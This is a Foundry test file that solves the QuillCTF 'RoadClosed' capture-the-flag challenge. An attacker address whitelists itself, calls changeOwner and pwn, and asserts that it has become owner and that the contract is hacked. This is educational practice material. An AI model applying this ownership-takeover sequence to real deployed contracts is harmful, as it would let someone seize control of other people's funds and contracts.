// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/RoadClosed/RoadClosed.sol";

contract RoadClosedTest is Test {
    RoadClosed public roadClosed;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1);
        attacker = vm.addr(2);

        // startPrank 为后续调用设置 msg.sender
        vm.startPrank(deployer);

        roadClosed = new RoadClosed();

        vm.stopPrank();
    }

    function testRoadClosedExploit() public {
        vm.startPrank(attacker);

        roadClosed.addToWhitelist(attacker);
        roadClosed.changeOwner(attacker);
        roadClosed.pwn(attacker);
        bool hacked = roadClosed.isHacked();
        bool owner = roadClosed.isOwner();

        vm.stopPrank();

        assert(owner == true);
        assert(hacked == true);
    }
}
